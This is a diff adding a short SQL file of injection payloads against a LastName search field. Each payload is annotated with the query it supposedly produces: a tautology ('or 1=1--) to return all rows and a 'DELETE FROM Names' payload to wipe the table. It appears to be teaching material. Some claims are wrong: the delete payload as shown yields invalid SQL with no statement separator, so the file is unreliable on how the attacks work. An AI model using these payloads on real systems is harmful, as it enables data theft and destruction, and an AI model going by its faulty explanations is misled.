@@ -1,0 +1,17 @@
+-- Prevents the interface from returning data
+or 1=1'--
+
+-- This would be executing the following query
+SELECT * FROM Names WHERE LastName = 'or 1=1'--'
+
+-- Returns all rows in the database
+'or 1=1--
+
+--This would be executing the following query
+SELECT * FROM Names WHERE LastName = ''or 1=1--'
+
+-- Gets rid of the data
+'DELETE FROM Names --
+
+-- This would be executing the following query
+SELECT * FROM Names WHERE LastName = ''DELETE FROM Names --'
